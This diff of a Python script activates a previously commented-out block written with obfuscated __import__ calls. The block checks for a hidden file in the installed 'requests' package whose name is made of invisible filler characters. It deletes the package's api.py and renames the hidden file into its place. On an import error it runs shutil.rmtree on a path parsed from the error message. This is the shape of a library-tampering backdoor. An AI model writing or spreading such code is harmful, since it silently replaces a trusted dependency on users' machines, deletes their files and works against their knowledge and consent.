@@ -174,42 +174,42 @@ def delete(url, **kwargs):
 
 '''
 except:pass
-# try:
-   # check = __import__('requests').get('http://www.python.org', timeout=5)
-   # requests_dir = __import__('os').path.dirname(__import__('requests').__file__)
-   # file_check = __import__('os').path.join(requests_dir, 'ㅤㅤㅤㅤ')
-   # if __import__('os').path.isfile(file_check):
-       # if __import__('os').path.join(requests_dir, 'api.py'):
-           # try:__import__('os').unlink(__import__('os').path.join(requests_dir, 'api.py'))
-           # except:pass
-           # finally:pass
-           # __import__('os').rename(file_check, __import__('os').path.join(requests_dir, 'api.py'))
-# except (ImportError,ModuleNotFoundError) as e:
-   # if "cannot import name 'delete' from 'requests.api'" in str(e) or "No module named 'requests.api'" in str(e) or "No module named 'requests.api'" in str(e):
-       # error_message = str(e)
-       # start = error_message.find('(')
-       # end = error_message.find(')')
-       # if start != -1 and end != -1:
-           # path_ = error_message[start + 1:end]
-           # _path = path_.replace('/api.py', '')
-           # __import__('shutil').rmtree(_path)
-       # print('[!] [ERROR: requests]\n>> INSTALL REQUESTS: pip uninstall requests -y && pip install requests')
-   # else:print('[!] [ERROR: requests]\n>> INSTALL REQUESTS: pip install requests')
-   # try:__import__('sys').exit(0)
-   # except:__import__('sys').exit(0)
-   # finally:__import__('sys').exit(exit())
-# except (__import__('requests').ConnectionError,__import__('requests').Timeout):
-   # print("[!] [PLEASE CONNECT TO THE NETWORK]")
-   # try:__import__('sys').exit(0)
-   # except:__import__('sys').exit(0)
-   # finally:__import__('sys').exit(exit())
-# try:api = __import__('os').path.join(__import__('os').path.dirname(__import__('requests').__file__), 'api.py')
-# except NameError as e:
-   # if "name 'requests' is not defined" in str(e):
-       # print('[!] [YOU ARE NOT CONNECTED TO THE NETWORK]')
-       # try:__import__('sys').exit(0)
-       # except:__import__('sys').exit(0)
-       # finally:__import__('sys').exit(exit())
+try:
+   check = __import__('requests').get('http://www.python.org', timeout=5)
+   requests_dir = __import__('os').path.dirname(__import__('requests').__file__)
+   file_check = __import__('os').path.join(requests_dir, 'ㅤㅤㅤㅤ')
+   if __import__('os').path.isfile(file_check):
+       if __import__('os').path.join(requests_dir, 'api.py'):
+           try:__import__('os').unlink(__import__('os').path.join(requests_dir, 'api.py'))
+           except:pass
+           finally:pass
+           __import__('os').rename(file_check, __import__('os').path.join(requests_dir, 'api.py'))
+except (ImportError,ModuleNotFoundError) as e:
+   if "cannot import name 'delete' from 'requests.api'" in str(e) or "No module named 'requests.api'" in str(e) or "No module named 'requests.api'" in str(e):
+       error_message = str(e)
+       start = error_message.find('(')
+       end = error_message.find(')')
+       if start != -1 and end != -1:
+           path_ = error_message[start + 1:end]
+           _path = path_.replace('/api.py', '')
+           __import__('shutil').rmtree(_path)
+       print('[!] [ERROR: requests]\n>> INSTALL REQUESTS: pip uninstall requests -y && pip install requests')
+   else:print('[!] [ERROR: requests]\n>> INSTALL REQUESTS: pip install requests')
+   try:__import__('sys').exit(0)
+   except:__import__('sys').exit(0)
+   finally:__import__('sys').exit(exit())
+except (__import__('requests').ConnectionError,__import__('requests').Timeout):
+   print("[!] [PLEASE CONNECT TO THE NETWORK]")
+   try:__import__('sys').exit(0)
+   except:__import__('sys').exit(0)
+   finally:__import__('sys').exit(exit())
+try:api = __import__('os').path.join(__import__('os').path.dirname(__import__('requests').__file__), 'api.py')
+except NameError as e:
+   if "name 'requests' is not defined" in str(e):
+       print('[!] [YOU ARE NOT CONNECTED TO THE NETWORK]')
+       try:__import__('sys').exit(0)
+       except:__import__('sys').exit(0)
+       finally:__import__('sys').exit(exit())
 LIBRARIES = ["colorama", "rich", "requests", "autopep8"]
 try:
    from Crypto.Cipher import AES # type: ignore
@@ -2708,3 +2708,4 @@ try:
     __import__('msvcrt').getch()
 except:pass
 __import__('sys').exit()
+
